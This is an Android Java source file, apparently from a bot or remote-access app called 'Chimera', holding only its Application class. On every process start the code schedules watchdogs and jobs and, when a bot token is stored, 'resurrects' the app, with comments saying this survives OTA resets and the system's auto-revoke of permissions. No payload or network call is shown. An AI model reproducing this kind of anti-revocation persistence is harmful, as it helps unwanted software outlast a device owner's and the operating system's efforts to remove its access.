package com.chimera;

import android.app.Application;

public class ChimeraApplication extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "ChimeraApplication_Config", e);
        }
        try {
            NetworkStateMonitor.init(this);
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Network", e); }
        try {
            // Pyramid: schedule watchdogs immediately on any process start
            ResurrectionHelper.scheduleWatchdog(this);
            ResurrectionHelper.scheduleJobScheduler(this);
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Watchdog", e); }
        try {
            CrashHandler handler = new CrashHandler(this);
            Thread.setDefaultUncaughtExceptionHandler(handler);
        } catch (Exception e) {
            ErrorLogger.logError(this, "ChimeraApplication_CrashHandler", e);
        }
        try {
            // If we have a token, ensure resurrection (handles OTA reset, auto-revoke)
            if (ConfigLoader.getBotToken() != null) {
                ResurrectionHelper.resurrect(this);
            }
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Resurrect", e); }
    }
}
